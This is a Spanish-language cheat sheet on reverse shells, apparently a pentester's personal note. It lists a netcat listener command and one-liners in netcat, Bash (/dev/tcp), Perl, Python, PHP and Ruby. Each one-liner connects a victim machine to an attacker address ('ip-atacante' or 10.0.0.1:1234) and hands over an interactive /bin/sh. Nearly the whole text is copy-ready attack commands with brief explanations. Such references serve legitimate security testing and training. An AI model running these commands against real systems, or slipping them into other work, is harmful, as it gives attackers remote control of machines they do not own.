___

- Tags: #herramientas #reverse-shell #netcat #explotación #enumeración #ipv4 #redes 

___
# Introducción

En el ámbito de la seguridad informática, la técnica de "**Reverse Shell**" es una estrategia utilizada por los expertos en ciberseguridad para evaluar y asegurar sistemas. Esta técnica implican el establecimiento de conexiones remotas para ejecutar comandos en máquinas comprometidas o realizar exploración de red. A continuación, nos centraremos en la técnica de "**Reverse Shell**" y proporcionaremos ejemplos de comandos comúnmente utilizados.

---

# Comandos para Reverse Shell:

1. **Escucha en un puerto:**

   ```bash
   nc -lvp puerto
   ```
   
   Este comando coloca la máquina atacante en modo escucha, esperando la conexión de la máquina víctima para establecer una **shell inversa**.

2. **Enviar una shell a la máquina atacante:**
   
   ```bash
   nc -e /bin/bash ip-atacante puerto
   ```
   
   Con este comando, se envía una **shell** a la máquina atacante. La máquina víctima se conecta al servidor de escucha y ejecuta una instancia de la **shell** especificada.

___
# Alternativas sin netcat:

1. **Bash**: 

   ```bash
   bash -i >& /dev/tcp/ip-atacante/puerto 0>&1
   ```

   En situaciones donde la máquina víctima no cuenta con [[Netcat]], este comando proporciona una alternativa. Establece una conexión a través de Bash utilizando redirecciones para la entrada y salida estándar, logrando una **shell inversa**.

2. **Perl:**

   ```bash 
   perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   ```
   
   El código en Perl establece una conexión [[TCP]] y ejecuta una shell interactiva.

3. **Python:**

   ```bash
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   ```
   
   Este script en Python crea una conexión [[TCP]] y ejecuta una shell interactiva.

4. **PHP:**

   ```bash
   php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```
   
   El código en PHP utiliza `fsockopen` para abrir una conexión y ejecutar una shell.

5. **Ruby:**

   ```bash
   ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
   ```
   
   El script Ruby crea una conexión [[TCP]] y ejecuta una shell interactiva.

